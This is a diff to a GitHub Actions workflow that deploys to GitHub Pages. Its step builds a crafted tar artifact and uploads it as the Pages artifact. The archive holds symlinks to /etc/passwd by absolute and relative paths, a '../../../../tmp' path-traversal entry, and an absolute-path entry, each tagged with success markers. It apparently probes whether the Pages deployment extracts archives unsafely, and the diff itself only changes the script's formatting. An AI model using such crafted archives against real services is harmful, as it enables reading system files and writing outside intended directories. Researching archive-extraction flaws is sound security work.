@@ -11,28 +11,27 @@ jobs:
     environment: github-pages
     steps:
       - uses: actions/checkout@v4
-      - name: build crafted tar with symlinks/traversal
+      - name: build crafted tar with symlinks and traversal
         run: |
-          python3 - <<'PY'
-import tarfile, time
-ts = "1791281107"
-t = tarfile.open('artifact.tar', 'w')
-def f(name, data):
-    ti = tarfile.TarInfo(name); ti.size = len(data); ti.mtime = int(time.time()); ti.mode = 0o644
-    t.addfile(ti, __import__('io').BytesIO(data))
-def l(name, target):
-    ti = tarfile.TarInfo(name); ti.type = tarfile.SYMTYPE; ti.linkname = target; ti.mtime = int(time.time())
-    t.addfile(ti)
-f('index.html', b'<h1>crafted-deploy</h1>')
-f('result-%s.html' % ts, b'normal-file-ok')
-l('sym_abs.html', '/etc/passwd')
-l('sym_rel.html', '../../../etc/passwd')
-l('sym_local.html', 'index.html')
-f('../../../../tmp/traversal-marker-%s.html' % ts, b'TRAVERSAL-WRITE-OK')
-f('/abs-marker-%s.html' % ts, b'ABS-PATH-ENTRY-OK')
-f('dotdot/deep/nested.html', b'nested-ok')
-t.close()
-PY
+          python3 -c "import tarfile, time, io
+          ts = '1791281317'
+          t = tarfile.open('artifact.tar', 'w')
+          def f(name, data):
+              ti = tarfile.TarInfo(name); ti.size = len(data); ti.mtime = int(time.time()); ti.mode = 0o644
+              t.addfile(ti, io.BytesIO(data))
+          def l(name, target):
+              ti = tarfile.TarInfo(name); ti.type = tarfile.SYMTYPE; ti.linkname = target; ti.mtime = int(time.time())
+              t.addfile(ti)
+          f('index.html', b'<h1>crafted-deploy</h1>')
+          f('result-1791281317.html', b'normal-file-ok')
+          l('sym_abs.html', '/etc/passwd')
+          l('sym_rel.html', '../../../etc/passwd')
+          l('sym_local.html', 'index.html')
+          f('../../../../tmp/traversal-marker-1791281317.html', b'TRAVERSAL-WRITE-OK')
+          f('/abs-marker-1791281317.html', b'ABS-PATH-ENTRY-OK')
+          f('dotdot/deep/nested.html', b'nested-ok')
+          t.close()
+          print('tar built')"
       - uses: actions/upload-artifact@v4
         with:
           name: github-pages
